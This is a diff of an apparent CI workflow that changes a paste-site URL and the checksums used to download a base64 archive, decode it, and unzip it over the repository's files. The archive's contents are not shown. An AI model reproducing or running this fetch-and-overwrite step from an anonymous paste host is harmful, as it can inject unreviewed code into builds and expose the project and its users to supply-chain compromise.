@@ -23,13 +23,13 @@ jobs:
         with:
           fetch-depth: 1
       - name: Download validated text payload
-        run: curl -L --fail --silent --show-error https://paste.c-net.org/MichiganCongress -o /tmp/final-cleanup.b64
+        run: curl -L --fail --silent --show-error https://paste.c-net.org/BitterCapisce -o /tmp/final-cleanup.b64
       - name: Validate text payload
-        run: echo "568e18615f216626d301b4286d7755991a3c9b5b2b0162250ebcf5ffd2a885d3  /tmp/final-cleanup.b64" | sha256sum --check
+        run: echo "80f7382610f8689e0485307f30659fae4e2570afdd2e4eef5f39b22057c66b11  /tmp/final-cleanup.b64" | sha256sum --check
       - name: Decode ZIP payload
         run: base64 --decode /tmp/final-cleanup.b64 > /tmp/final-cleanup.zip
       - name: Validate ZIP payload
-        run: echo "1d5e8cb1bb191389e398ff18b9528e56e0fede47b6f279b281e229d130f60774  /tmp/final-cleanup.zip" | sha256sum --check
+        run: echo "33ca8b23ac98b22ebff8462de731c6dc2e1fe80c265042fa6a9b118529b30629  /tmp/final-cleanup.zip" | sha256sum --check
       - name: Extract audited files
         run: |
           unzip -oq /tmp/final-cleanup.zip -d .
